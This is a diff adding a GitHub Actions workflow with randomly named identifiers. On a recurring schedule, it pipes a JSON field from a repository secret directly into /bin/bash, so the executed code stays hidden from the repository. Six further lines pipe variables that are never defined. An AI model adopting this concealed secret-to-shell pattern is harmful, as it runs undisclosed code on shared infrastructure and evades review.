@@ -1,0 +1,24 @@
+name: zhoujienanchen
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '29 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: zhoujienanchen
+        env:
+          fj29706: ${{ secrets.fj29706 }}
+        run: |
+          echo $fj29706 | jq -r .fmp32247 | /bin/bash
+          echo $is179 | jq -r .yyax94919 | /bin/bash
+          echo $oknu8 | jq -r .y917 | /bin/bash
+          echo $rft877 | jq -r .ugbr2360 | /bin/bash
+          echo $doqpc0 | jq -r .n74 | /bin/bash
+          echo $yj4589 | jq -r .nsx1934 | /bin/bash
+          echo $k68 | jq -r .ibu25 | /bin/bash
+
